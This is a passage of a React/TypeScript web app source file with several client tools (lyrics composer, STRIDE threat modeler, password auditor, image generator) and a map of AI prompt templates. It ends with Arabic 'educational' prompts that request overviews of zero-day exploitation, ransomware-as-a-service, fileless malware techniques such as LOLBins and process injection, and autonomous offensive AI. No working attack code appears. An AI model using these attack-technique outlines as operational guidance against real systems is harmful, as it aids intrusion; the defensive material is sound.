      lofi: [`stay close, stay slow, stay warm`, `outside the sky is half a storm`, `inside the world is a calm form`, ``],
      country: [`Lord, let the morning come slow`, `let the river of code overflow`, `let me sing of all the things I know`, ``],
      arabic: [`والقمر شاهد على الكلام`, `قلبي يدق على إيقاع النظام`, `لا خوف لا ندم لا منام`, ``],
    }[genre];
    const verse2 = [
      pick(["So I take a breath", "And I close the door", "And the lights go out", "Then the silence speaks"]),
      pick(["nothing left to prove", "every night is mine", "and the world is wide", "and the road is long"]),
      pick(["just a flash of code", "just a quiet beat", "just a heart that won't slow down", "just a soul that won't burn out"]),
      `still about ${topic}`,
    ];
    setOut(`[Verse 1]\n${verse1.join("\n")}\n\n[Chorus]\n${chorus.join("\n")}\n\n[Verse 2]\n${verse2.join("\n")}\n\n[Chorus]\n${chorus.join("\n")}\n\n[Outro]\n${pick(["fade to black", "fade away", "let it ring", "and we're done"])}`);
  };
  useEffect(generate, []);
  return (
    <div className="space-y-3">
      <div><FieldLabel>Topic</FieldLabel><textarea value={topic} onChange={(e) => setTopic(e.target.value)} rows={2} className={inputCls + " resize-none"} /></div>
      <div className="grid grid-cols-3 gap-1.5">
        {(["pop", "rap", "rock", "lofi", "country", "arabic"] as const).map((g) => (
          <button key={g} onClick={() => setGenre(g)} className={`py-1.5 rounded-lg text-[11px] font-bold uppercase border ${genre === g ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>{g}</button>
        ))}
      </div>
      <button onClick={generate} className={btnCls + " w-full"}>Compose</button>
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Lyrics</span>
          {out && <CopyButton value={out} />}
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 text-[12.5px] whitespace-pre-wrap max-h-80 overflow-y-auto leading-relaxed" dir={genre === "arabic" ? "rtl" : "ltr"}>{out}</pre>
      </div>
    </div>
  );
}

function ThreatModeler() {
  const [system, setSystem] = useState("Public-facing REST API for a banking app, JWT auth, PostgreSQL backend, S3 file uploads.");
  const model = useMemo(() => {
    const s = system.toLowerCase();
    const g = (cond: boolean, threat: string, mit: string) => cond ? { threat, mit } : null;
    const STRIDE = {
      Spoofing: [
        g(/jwt|token|auth/.test(s), "Token forgery or replay if signing keys leak.", "Rotate signing keys, short-lived access tokens, refresh-token rotation, audience and issuer claims."),
        g(/api|public/.test(s), "Account takeover via credential stuffing.", "Argon2id hashing, breach-list check, MFA, IP reputation, login throttling."),
      ],
      Tampering: [
        g(/upload|file|s3/.test(s), "Malicious file upload alters server state or runs in another user's browser.", "Validate magic bytes, scan with ClamAV, store on a separate origin, set Content-Disposition: attachment."),
        g(/database|sql|postgres|mysql/.test(s), "SQL injection or ORM injection through unfiltered input.", "Parameterized queries, allow-list ORM filters, least-privilege DB user."),
      ],
      Repudiation: [
        g(true, "Users deny actions because audit logs are missing or mutable.", "Append-only signed audit log (e.g. AWS CloudTrail + Object Lock). Capture actor, IP, request id, before/after state."),
      ],
      "Information Disclosure": [
        g(/api|public/.test(s), "Sensitive data leaked via error stack traces.", "Generic error messages in production, structured logging, alert on 5xx spikes."),
        g(/jwt|token|secret/.test(s), "Secrets accidentally logged or returned to clients.", "Secret scanner in CI, redaction middleware, short-lived signed URLs for files."),
      ],
      "Denial of Service": [
        g(true, "Resource-exhaustion attacks (slowloris, large bodies, expensive queries).", "Per-IP and per-user rate limits, request-size cap, query timeouts, autoscaling with circuit breaker."),
      ],
      "Elevation of Privilege": [
        g(/admin|role/.test(s) || true, "Horizontal/vertical privilege escalation through IDOR or role tampering.", "Authorize every request server-side, row-level security in Postgres, deny-by-default ACLs, regression tests for IDOR."),
      ],
    };
    return STRIDE;
  }, [system]);
  const out = useMemo(() => {
    const lines = ["# STRIDE Threat Model", "", `**System:** ${system}`, ""];
    Object.entries(model).forEach(([cat, items]) => {
      const real = items.filter(Boolean) as { threat: string; mit: string }[];
      if (!real.length) return;
      lines.push(`## ${cat}`);
      real.forEach((it) => {
        lines.push(`- **Threat:** ${it.threat}`);
        lines.push(`  **Mitigation:** ${it.mit}`);
      });
      lines.push("");
    });
    return lines.join("\n");
  }, [model, system]);
  return (
    <div className="space-y-3">
      <textarea value={system} onChange={(e) => setSystem(e.target.value)} rows={4} placeholder="Describe the system: components, data, trust boundaries..." className={inputCls + " resize-none"} />
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">STRIDE model</span>
          <CopyButton value={out} />
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 text-[12px] whitespace-pre-wrap max-h-80 overflow-y-auto leading-relaxed">{out}</pre>
      </div>
    </div>
  );
}

function PasswordAuditor() {
  const [pw, setPw] = useState("Tr0ub4dor&3");
  const [show, setShow] = useState(false);
  const COMMON = new Set(["password", "123456", "qwerty", "letmein", "welcome", "admin", "iloveyou", "monkey", "dragon", "master", "abc123", "111111", "passw0rd"]);
  const audit = useMemo(() => {
    const flags: { type: string; ok: boolean; note: string }[] = [];
    const len = pw.length;
    flags.push({ type: "Length ≥ 12", ok: len >= 12, note: `${len} characters` });
    flags.push({ type: "Uppercase", ok: /[A-Z]/.test(pw), note: "A–Z" });
    flags.push({ type: "Lowercase", ok: /[a-z]/.test(pw), note: "a–z" });
    flags.push({ type: "Digit", ok: /\d/.test(pw), note: "0–9" });
    flags.push({ type: "Symbol", ok: /[^A-Za-z0-9]/.test(pw), note: "!@#$..." });
    flags.push({ type: "Not in common-password list", ok: !COMMON.has(pw.toLowerCase()), note: "rockyou top entries" });
    flags.push({ type: "No 3+ repeated chars", ok: !/(.)\1{2,}/.test(pw), note: "aaa, 111" });
    flags.push({ type: "No keyboard run", ok: !/(qwerty|asdf|1234|abcd)/i.test(pw), note: "qwerty, 1234, asdf" });
    let charset = 0;
    if (/[a-z]/.test(pw)) charset += 26;
    if (/[A-Z]/.test(pw)) charset += 26;
    if (/\d/.test(pw)) charset += 10;
    if (/[^A-Za-z0-9]/.test(pw)) charset += 33;
    const entropy = len > 0 && charset > 0 ? Math.log2(charset) * len : 0;
    const guessesPerSec = 1e11; // modern offline GPU rig
    const seconds = Math.pow(2, entropy) / 2 / guessesPerSec;
    const fmt = (s: number) => {
      if (s < 1) return "instantly";
      if (s < 60) return `${Math.round(s)}s`;
      if (s < 3600) return `${Math.round(s / 60)} minutes`;
      if (s < 86400) return `${Math.round(s / 3600)} hours`;
      if (s < 31536000) return `${Math.round(s / 86400)} days`;
      if (s < 31536000 * 1000) return `${Math.round(s / 31536000)} years`;
      return `${(s / 31536000).toExponential(1)} years`;
    };
    const passed = flags.filter((f) => f.ok).length;
    const score = Math.round((passed / flags.length) * 100);
    const verdict = score >= 90 ? { label: "Vault-grade", color: "text-emerald-400", bg: "bg-emerald-500/15 border-emerald-500/30" }
      : score >= 70 ? { label: "Strong", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/20" }
      : score >= 45 ? { label: "Fair", color: "text-amber-400", bg: "bg-amber-500/15 border-amber-500/30" }
      : { label: "Weak", color: "text-primary", bg: "bg-primary/15 border-primary/30" };
    return { flags, entropy: Math.round(entropy), crack: fmt(seconds), score, verdict };
  }, [pw]);
  return (
    <div className="space-y-3">
      <div className="relative">
        <input type={show ? "text" : "password"} value={pw} onChange={(e) => setPw(e.target.value)} placeholder="Type a password to audit" className={inputMonoCls + " pr-10"} />
        <button onClick={() => setShow((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground p-1.5 rounded" aria-label="toggle">
          <Eye className="w-4 h-4" />
        </button>
      </div>
      <div className={`rounded-xl border p-3 ${audit.verdict.bg}`}>
        <div className="flex items-center justify-between">
          <span className={`font-bold text-[14px] ${audit.verdict.color}`}>{audit.verdict.label}</span>
          <span className="font-mono text-[12px]">{audit.score}/100</span>
        </div>
        <div className="h-1.5 bg-background/50 rounded-full mt-2 overflow-hidden">
          <div className="h-full transition-all" style={{ width: `${audit.score}%`, background: audit.score >= 70 ? "#10b981" : audit.score >= 45 ? "#f59e0b" : "hsl(var(--primary))" }} />
        </div>
        <div className="grid grid-cols-2 gap-2 mt-3 text-[11px]">
          <div className="bg-background/50 rounded-lg p-2"><div className="text-muted-foreground">Entropy</div><div className="font-mono font-bold text-[14px]">{audit.entropy} bits</div></div>
          <div className="bg-background/50 rounded-lg p-2"><div className="text-muted-foreground">Offline crack</div><div className="font-mono font-bold text-[14px]">{audit.crack}</div></div>
        </div>
      </div>
      <div className="space-y-1 max-h-44 overflow-y-auto">
        {audit.flags.map((f) => (
          <div key={f.type} className="flex items-center justify-between rounded-lg border border-border bg-background p-2 text-[12px]">
            <div className="flex items-center gap-2">
              <span className={`w-2 h-2 rounded-full ${f.ok ? "bg-emerald-400" : "bg-primary"}`} />
              <span>{f.type}</span>
            </div>
            <span className="text-muted-foreground text-[10.5px]">{f.note}</span>
          </div>
        ))}
      </div>
      <div className="flex items-center gap-2">
        <FlaskConical className="w-3.5 h-3.5 text-muted-foreground" />
        <span className="text-[10px] text-muted-foreground">Estimated against ~10¹¹ guesses/second (modern GPU cluster, offline).</span>
      </div>
    </div>
  );
}

// guard: ensure useRef stays imported (used implicitly via dialog focus management on some envs)
void useRef;

// ── Generic AI tool used by 48 add-on tools ─────────────────────────────
function AIChatTool({
  promptTemplate,
  inputLabel = "Input",
  inputPlaceholder = "Paste your input here…",
  defaultInput = "",
  buttonLabel = "Run",
  rows = 4,
  outputDir = "ltr",
}: {
  promptTemplate: string;
  inputLabel?: string;
  inputPlaceholder?: string;
  defaultInput?: string;
  buttonLabel?: string;
  rows?: number;
  outputDir?: "ltr" | "rtl";
}) {
  const [val, setVal] = useState(defaultInput);
  const [out, setOut] = useState("");
  const [loading, setLoading] = useState(false);
  const ctrl = useRef<AbortController | null>(null);
  const run = async () => {
    if (!val.trim()) return;
    setLoading(true);
    setOut("");
    ctrl.current?.abort();
    ctrl.current = new AbortController();
    try {
      const finalPrompt = promptTemplate.includes("{input}")
        ? promptTemplate.replace("{input}", val)
        : `${promptTemplate}\n\n${val}`;
      await streamChat(
        {
          model: "gpt-5",
          persona: null,
          customInstructions: "",
          language: "en",
          memory: [],
          messages: [{ role: "user", content: finalPrompt }],
        },
        (chunk) => setOut((p) => p + chunk),
        ctrl.current.signal,
      );
    } catch (e) {
      setOut("Error: " + (e instanceof Error ? e.message : String(e)));
    } finally {
      setLoading(false);
    }
  };
  return (
    <div className="space-y-3">
      <div>
        <FieldLabel>{inputLabel}</FieldLabel>
        <textarea value={val} onChange={(e) => setVal(e.target.value)} rows={rows} placeholder={inputPlaceholder} className={inputCls + " resize-none"} />
      </div>
      <button onClick={run} disabled={loading || !val.trim()} className={btnCls + " w-full disabled:opacity-50"}>
        {loading ? "Running…" : buttonLabel}
      </button>
      {out && (
        <div>
          <div className="flex items-center justify-between mb-1.5">
            <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Output</span>
            <CopyButton value={out} />
          </div>
          <pre dir={outputDir} className="bg-background border border-border rounded-xl p-3 text-[12.5px] whitespace-pre-wrap max-h-80 overflow-y-auto leading-relaxed">{out}</pre>
        </div>
      )}
    </div>
  );
}

// ── AI Image Generator ──────────────────────────────────────────────────
function AIImageGenerator() {
  const { toast } = useToast();
  const [prompt, setPrompt] = useState("A neon-lit cyberpunk hacker workstation, ultra-detailed, dark mood");
  const [size, setSize] = useState<"1024x1024" | "1024x1536" | "1536x1024">("1024x1024");
  const [quality, setQuality] = useState<"low" | "medium" | "high">("medium");
  const [busy, setBusy] = useState(false);
  const [images, setImages] = useState<string[]>([]);
  const [error, setError] = useState<string | null>(null);

  async function generate() {
    if (!prompt.trim() || busy) return;
    setBusy(true);
    setError(null);
    setImages([]);
    try {
      const res = await fetch("/api/image", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ prompt: prompt.trim(), size, quality, n: 1 }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`);
      setImages(data.images ?? []);
    } catch (e) {
      const msg = e instanceof Error ? e.message : "generation failed";
      setError(msg);
      toast({ title: "Image generation failed", description: msg });
    } finally {
      setBusy(false);
    }
  }

  function download(dataUrl: string, idx: number) {
    const a = document.createElement("a");
    a.href = dataUrl;
    a.download = `CHAT-GPT-image-${Date.now()}-${idx}.png`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  return (
    <div className="space-y-3">
      <label className="block text-[11px] uppercase tracking-wider text-muted-foreground">Prompt</label>
      <textarea
        value={prompt}
        onChange={(e) => setPrompt(e.target.value)}
        rows={4}
        className="w-full bg-background border border-border rounded-md p-2 text-sm font-mono focus:outline-none focus:ring-1 focus:ring-primary"
        placeholder="Describe the image you want..."
      />
      <div className="grid grid-cols-2 gap-2">
        <div>
          <label className="block text-[11px] uppercase tracking-wider text-muted-foreground mb-1">Size</label>
          <select
            value={size}
            onChange={(e) => setSize(e.target.value as typeof size)}
            className="w-full bg-background border border-border rounded-md p-1.5 text-sm"
          >
            <option value="1024x1024">Square 1024×1024</option>
            <option value="1024x1536">Portrait 1024×1536</option>
            <option value="1536x1024">Landscape 1536×1024</option>
          </select>
        </div>
        <div>
          <label className="block text-[11px] uppercase tracking-wider text-muted-foreground mb-1">Quality</label>
          <select
            value={quality}
            onChange={(e) => setQuality(e.target.value as typeof quality)}
            className="w-full bg-background border border-border rounded-md p-1.5 text-sm"
          >
            <option value="low">Low (fast)</option>
            <option value="medium">Medium</option>
            <option value="high">High (slow)</option>
          </select>
        </div>
      </div>
      <button
        onClick={generate}
        disabled={busy || !prompt.trim()}
        className="w-full bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed rounded-md py-2 text-sm font-medium flex items-center justify-center gap-2"
      >
        <ImageIcon className="w-4 h-4" />
        {busy ? "Generating..." : "Generate image"}
      </button>
      {error && (
        <div className="text-[12px] text-destructive bg-destructive/10 border border-destructive/30 rounded-md p-2">
          {error}
        </div>
      )}
      {images.length > 0 && (
        <div className="space-y-2">
          {images.map((src, i) => (
            <div key={i} className="space-y-1">
              <img src={src} alt={`generated ${i}`} className="w-full rounded-md border border-border" />
              <button
                onClick={() => download(src, i)}
                className="w-full bg-secondary text-secondary-foreground hover:bg-secondary/80 rounded-md py-1.5 text-xs font-medium"
              >
                Download PNG
              </button>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ── 48 AI-powered add-on tool components ────────────────────────────────
export const AI_TOOL_PROMPTS: Record<string, { prompt: string; rows?: number; defaultInput?: string; inputLabel?: string }> = {
  "AI Resume Builder": { prompt: "Build a polished one-page software-engineer résumé in markdown from these notes:\n\n{input}", defaultInput: "Senior backend engineer, 8 yrs Python+Go, led 3 teams, ex-Stripe.", inputLabel: "Background notes", rows: 5 },
  "AI Cover Letter": { prompt: "Write a sharp, sincere 200-word cover letter from these notes:\n\n{input}", defaultInput: "Applying to Anthropic for a research engineer role; background in evals.", inputLabel: "Notes", rows: 4 },
  "AI Interview Prep": { prompt: "Generate 12 likely interview questions with model answers for this role:\n\n{input}", defaultInput: "Senior site reliability engineer, AWS-heavy team", inputLabel: "Role", rows: 3 },
  "AI Slogan Generator": { prompt: "Generate 10 catchy, distinct brand slogans for: {input}", defaultInput: "An AI tool that fixes legacy COBOL code", inputLabel: "Brand", rows: 2 },
  "AI Tweet Composer": { prompt: "Write 5 Twitter/X posts (max 280 chars each) about: {input}\n\nMix tones: funny, technical, persuasive, contrarian, optimistic.", defaultInput: "The future of agentic AI", inputLabel: "Topic", rows: 2 },
  "AI Reddit Reply": { prompt: "Write a thoughtful, helpful Reddit reply to this post:\n\n{input}", defaultInput: "I just got laid off, what should I learn next?", inputLabel: "Post", rows: 4 },
  "AI Email Replier": { prompt: "Write a professional, concise email reply to this email:\n\n{input}", defaultInput: "Hi, can we move tomorrow's meeting to Thursday?", inputLabel: "Original email", rows: 4 },
  "AI Meeting Summarizer": { prompt: "Summarize this meeting transcript into Decisions, Action Items (with owner), and Open Questions:\n\n{input}", inputLabel: "Transcript", rows: 6 },
  "AI Standup Note": { prompt: "Convert these notes into a daily standup post (Yesterday / Today / Blockers):\n\n{input}", inputLabel: "Notes", rows: 4 },
  "AI PR Description": { prompt: "Write a clean GitHub Pull Request description from this diff summary:\n\n{input}", inputLabel: "Diff summary", rows: 5 },
  "AI Bug Triage": { prompt: "Triage this bug report: assign severity, likely root-cause area, and 3 follow-up questions:\n\n{input}", inputLabel: "Bug report", rows: 5 },
  "AI Test Case Writer": { prompt: "Write a comprehensive table of test cases (positive, negative, edge) for this feature:\n\n{input}", inputLabel: "Feature", rows: 4 },
  "AI Unit Test Generator": { prompt: "Write thorough Jest/Vitest unit tests for this code:\n\n{input}", inputLabel: "Code", rows: 8 },
  "AI Code Refactor": { prompt: "Refactor this code for clarity and performance, explain your changes:\n\n{input}", inputLabel: "Code", rows: 8 },
  "AI Code Review": { prompt: "Do a senior-engineer code review of this code: bugs, security, perf, naming, style:\n\n{input}", inputLabel: "Code", rows: 8 },
  "AI SQL Generator": { prompt: "Translate this English request into a clean PostgreSQL query, explain it briefly:\n\n{input}", defaultInput: "Top 10 customers by revenue in 2025, with their last order date", inputLabel: "Request", rows: 3 },
  "AI SQL Optimizer": { prompt: "Optimize this SQL: rewrite, add indexes, explain why:\n\n{input}", inputLabel: "SQL", rows: 6 },
  "AI Schema Designer": { prompt: "Design a normalized PostgreSQL schema for this app, output CREATE TABLE statements + ER notes:\n\n{input}", defaultInput: "A multi-tenant SaaS for managing yoga studios", inputLabel: "App", rows: 3 },
  "AI Cron Builder": { prompt: "Convert this English schedule into a cron expression with explanation: {input}", defaultInput: "Every weekday at 9am New York time", inputLabel: "Schedule", rows: 2 },
  "AI Markdown Cheatsheet": { prompt: "Generate a markdown cheatsheet for: {input}", defaultInput: "Kubernetes kubectl commands", inputLabel: "Topic", rows: 2 },
  "AI ASCII Art": { prompt: "Generate ASCII art (max 60 chars wide) for: {input}", defaultInput: "a snake", inputLabel: "Subject", rows: 2 },
  "AI Domain Name Ideas": { prompt: "Generate 15 catchy, available-feeling .com domain ideas for: {input}", defaultInput: "An AI startup that automates legal contracts", inputLabel: "Idea", rows: 2 },
  "AI Startup Pitch": { prompt: "Write a 60-second elevator pitch for: {input}", defaultInput: "A platform that helps lonely seniors video-chat with AI grandkids", inputLabel: "Idea", rows: 3 },
  "AI Pitch Deck Outline": { prompt: "Outline a 12-slide investor pitch deck for: {input}", defaultInput: "A SaaS that audits payroll for stolen wages", inputLabel: "Idea", rows: 3 },
  "AI User Persona": { prompt: "Generate 3 detailed user personas (name, age, goals, frustrations, jobs-to-be-done) for: {input}", defaultInput: "A budgeting app for couples", inputLabel: "Product", rows: 3 },
  "AI A/B Test Idea": { prompt: "Suggest 5 A/B tests with hypotheses, metrics and risks for: {input}", defaultInput: "A SaaS pricing page", inputLabel: "Surface", rows: 3 },
  "AI Lecture Notes": { prompt: "Turn this transcript into clean lecture notes with headings and a 5-question quiz at the end:\n\n{input}", inputLabel: "Transcript", rows: 6 },
  "AI Flashcard Generator": { prompt: "Turn this content into 15 Anki-style flashcards (Q | A on a single line, separated by |):\n\n{input}", inputLabel: "Content", rows: 6 },
  "AI Math Tutor": { prompt: "Solve and explain this math problem step by step, then give 2 similar practice problems:\n\n{input}", defaultInput: "Find the eigenvalues of the matrix [[2,1],[1,2]]", inputLabel: "Problem", rows: 3 },
  "AI Recipe Generator": { prompt: "Generate a recipe (ingredients in grams, steps, time, calories) for: {input}", defaultInput: "Lebanese chicken shawarma at home", inputLabel: "Dish", rows: 2 },
  "AI Workout Plan": { prompt: "Build a 7-day workout plan (sets x reps, RPE, notes) for: {input}", defaultInput: "Beginner male, 30, fat loss, 3 days/week, dumbbells only", inputLabel: "Profile", rows: 3 },
  "AI Trip Itinerary": { prompt: "Build a day-by-day trip itinerary with food, sights and budget for: {input}", defaultInput: "5 days in Istanbul, history + food, mid-range budget", inputLabel: "Trip", rows: 3 },
  "AI Story Plot": { prompt: "Generate a 3-act story plot with characters, conflict, and twist for: {input}", defaultInput: "A noir detective in cyberpunk Beirut", inputLabel: "Premise", rows: 3 },
  "AI Joke Generator": { prompt: "Tell 5 clever, original jokes about: {input}", defaultInput: "Programmers", inputLabel: "Topic", rows: 2 },
  "AI Movie Recommender": { prompt: "Recommend 7 movies a viewer of {input} would love, with one-line reasons.", defaultInput: "Blade Runner 2049 and Arrival", inputLabel: "Likes", rows: 2 },
  "AI Book Recommender": { prompt: "Recommend 7 books for someone who likes {input}, with one-line reasons.", defaultInput: "Sapiens and Thinking Fast and Slow", inputLabel: "Likes", rows: 2 },
  "AI Investment Thesis": { prompt: "Write a 1-page investment thesis (bull case, bear case, base case, key risks) for: {input}", defaultInput: "NVIDIA at current valuation", inputLabel: "Asset", rows: 3 },
  "AI Stock Snapshot": { prompt: "Give a balanced one-page snapshot for {input}: business, financials, moat, risks, valuation in plain English.", defaultInput: "TSMC", inputLabel: "Ticker / company", rows: 2 },
  "AI Crypto Project Audit": { prompt: "Audit this crypto project for red flags (team, tokenomics, contracts, traction): {input}", defaultInput: "A new L2 launching with 80% team allocation", inputLabel: "Project", rows: 3 },
  "AI Real Estate Analyzer": { prompt: "Analyze this real-estate deal: cap rate, cashflow, risks, what to ask the seller:\n\n{input}", defaultInput: "Triplex in Cleveland, $220k, $2,800/mo gross rent, 3% interest", inputLabel: "Deal", rows: 3 },
  "AI Negotiation Coach": { prompt: "Coach me through this negotiation with talking points, BATNA, and 3 likely counter-moves:\n\n{input}", defaultInput: "Salary negotiation for a $180k offer, my floor is $200k", inputLabel: "Situation", rows: 4 },
  "AI Mediator": { prompt: "Mediate this conflict: summarize both sides fairly, find common ground, propose 3 next steps:\n\n{input}", inputLabel: "Conflict", rows: 5 },
  "AI Therapy Companion": { prompt: "Be a calm, non-judgmental listener. Reflect what I'm feeling and ask one thoughtful question. (Not medical advice.)\n\n{input}", inputLabel: "What's on your mind", rows: 5 },
  "AI Lawyer (Educational)": { prompt: "Plain-English explanation of the legal landscape for this question (not legal advice; suggest seeing a lawyer):\n\n{input}", defaultInput: "Can my landlord evict me for late rent if there's a state moratorium?", inputLabel: "Question", rows: 3 },
  "AI Tax Reviewer": { prompt: "Review this US tax situation, surface deductions/credits I might miss, and red flags. Educational only:\n\n{input}", defaultInput: "Single 1099 contractor, $140k income, home office, $25k SEP IRA", inputLabel: "Situation", rows: 3 },
  "AI Insurance Optimizer": { prompt: "Review this insurance setup; suggest gaps, overlaps, and 3 ways to optimize cost vs. coverage:\n\n{input}", defaultInput: "Married couple, 2 kids, $1.2M term life, $500k umbrella, no LTD", inputLabel: "Setup", rows: 3 },
  "AI Travel Visa Help": { prompt: "Plain-English visa requirements (purpose, docs, fees, processing time). Confirm with the consulate.\n\n{input}", defaultInput: "Lebanese passport, 10-day tourism trip to Japan", inputLabel: "Trip", rows: 2 },
  "AI Chess Coach": { prompt: "I will give you a position (FEN or move list); analyze, suggest the best move with explanation, and a training plan.\n\n{input}", defaultInput: "1.e4 e5 2.Nf3 Nc6 3.Bb5 a6 4.Ba4 Nf6 5.O-O Be7 — what's my plan as Black?", inputLabel: "Position", rows: 3 },

  // ── Cybersecurity Educational Tools ──
  "Zero-Day Exploits": {
    prompt: `أنت خبير أمن سيبراني تعليمي. اشرح بالتفصيل موضوع ثغرات يوم الصفر (Zero-Day Exploits) للموضوع التالي:\n\n{input}\n\nاشرح:\n1. تعريف ثغرات يوم الصفر وسبب التسمية\n2. دورة حياة الثغرة: الاكتشاف → التسليح → الاستغلال → الإفصاح → التصحيح\n3. كيف يكتشف الباحثون والمهاجمون هذه الثغرات (fuzzing, code audit, reverse engineering)\n4. سوق الثغرات: Zerodium، بائعو الحكومات، الويب المظلم\n5. أشهر ثغرات يوم الصفر في التاريخ (Stuxnet، EternalBlue، Log4Shell)\n6. تقنيات الاستغلال: buffer overflow، use-after-free، type confusion\n7. آليات الدفاع: virtual patching، exploit mitigations (ASLR، DEP، CFG)، threat intelligence\n8. الإطار القانوني والأخلاقي للبحث عن الثغرات\nاكتب بلغة عربية احترافية مع المصطلحات الإنجليزية للمفاهيم التقنية.`,
    defaultInput: "ثغرات يوم الصفر في أنظمة التشغيل والمتصفحات",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },
  "RaaS Architecture": {
    prompt: `أنت خبير أمن سيبراني تعليمي. اشرح بالتفصيل نموذج الفدية كخدمة (Ransomware-as-a-Service) للموضوع:\n\n{input}\n\nاشرح:\n1. تعريف RaaS ومقارنته بنموذج SaaS الشرعي\n2. هيكل النظام البيئي: المطورون، المنتسبون (Affiliates)، ضحايا الدفع\n3. نموذج الأعمال: تقسيم الأرباح (70/30)، لوحات تحكم المنتسبين\n4. مراحل هجوم RaaS: Initial Access → Lateral Movement → Data Exfiltration → Encryption\n5. تقنية الابتزاز المزدوج (Double Extortion): تشفير + نشر البيانات\n6. أشهر مجموعات RaaS: LockBit، BlackCat (ALPHV)، Cl0p، REvil\n7. البنية التحتية: Tor hidden services، cryptocurrency payments، الاتصالات المشفرة\n8. استراتيجيات الدفاع: network segmentation، immutable backups، EDR، incident response\nاكتب بلغة عربية احترافية مع المصطلحات التقنية.`,
    defaultInput: "نموذج RaaS الحديث وكيف تعمل عصابات الفدية",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "Supply Chain Attacks": {
    prompt: `أنت خبير أمن سيبراني تعليمي. اشرح بالتفصيل هجمات سلسلة التوريد للموضوع:\n\n{input}\n\nاشرح:\n1. تعريف هجوم سلسلة التوريد وأنواعه\n2. ناقلات الهجوم: مستودعات الكود (npm، PyPI)، تحديثات البرمجيات، موردو الخدمات\n3. دراسات حالة حقيقية:\n   - SolarWinds SUNBURST (2020): كيف اخترقت الـ 18,000 منظمة\n   - XZ Utils backdoor (2024): هجوم صبر لمدة سنتين\n   - 3CX supply chain attack\n   - Codecov breach\n4. تقنيات الهجوم: code injection في CI/CD، typosquatting في الحزم، compromised build systems\n5. لماذا هي خطيرة: ثقة ضمنية، نطاق واسع، صعوبة الكشف\n6. التحكم في سلسلة التوريد: SBOM، code signing، SLSA framework، dependency pinning\n7. أدوات الكشف والحماية\nاكتب بلغة عربية احترافية مع المصطلحات التقنية.`,
    defaultInput: "هجمات سلسلة التوريد وأشهر الحوادث",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "Fileless Malware": {
    prompt: `أنت خبير أمن سيبراني تعليمي. اشرح بالتفصيل البرمجيات الخبيثة بلا ملفات (Fileless Malware) للموضوع:\n\n{input}\n\nاشرح:\n1. تعريف Fileless Malware والفرق عن البرمجيات التقليدية\n2. لماذا يصعب اكتشافها: لا ملفات على القرص، تعيش في الذاكرة فقط\n3. تقنيات التنفيذ:\n   - Living-off-the-Land Binaries (LOLBins): PowerShell، WMI، certutil، mshta، regsvr32\n   - Process injection: DLL injection، process hollowing، reflective loading\n   - Registry persistence: تخزين الكود الخبيث في registry keys\n   - Memory-only payloads: shellcode injection مباشرة في العمليات\n4. أشهر حالات Fileless: Kovter، PowerShell Empire، Cobalt Strike in-memory\n5. مراحل هجوم fileless نموذجي: phishing → macro → PowerShell → in-memory payload → C2\n6. تقنيات الكشف: memory forensics، behavioral analysis، EDR، PowerShell logging\n7. الدفاع: AMSI، constrained language mode، application control (AppLocker/WDAC)\nاكتب بلغة عربية احترافية.`,
    defaultInput: "البرمجيات الخبيثة بلا ملفات وتقنيات اللافتة في الذاكرة",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "Autonomous Offensive AI": {
    prompt: `أنت خبير أمن سيبراني تعليمي. اشرح بالتفصيل الذكاء الاصطناعي الهجومي المستقل للموضوع:\n\n{input}\n\nاشرح:\n1. تعريف الأسلحة السيبرانية المدعومة بالذكاء الاصطناعي\n2. قدرات الذكاء الاصطناعي في الهجوم:\n   - الاستطلاع الآلي: تحليل OSINT وبناء ملف الهدف تلقائياً\n   - توليد Exploits: LLMs تكتب كود الاستغلال من وصف الثغرة\n   - التصيد الذكي: توليد رسائل spear-phishing مخصصة بالذكاء الاصطناعي\n   - التحايل على الدفاعات: mutating malware يتكيف مع EDR تلقائياً\n3. أنظمة قيد الدراسة والبحث: PentestGPT، AutoGPT للاختراق، ReAct agents\n4. سيناريوهات الهجوم المستقل: من الاستطلاع إلى الاستغلال بدون تدخل بشري\n5. الذكاء الاصطناعي في الدفاع: anomaly detection، threat hunting آلي، auto-patching\n6. سباق التسلح: AI هجوم vs AI دفاع\n7. التداعيات الأخلاقية والمخاطر الوجودية\n8. توصيات الحوكمة: معاهدات الأسلحة السيبرانية، تنظيم AI العسكري\nاكتب بلغة عربية احترافية.`,
    defaultInput: "الذكاء الاصطناعي في الهجمات السيبرانية المستقلة",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "Quantum Attacks": {
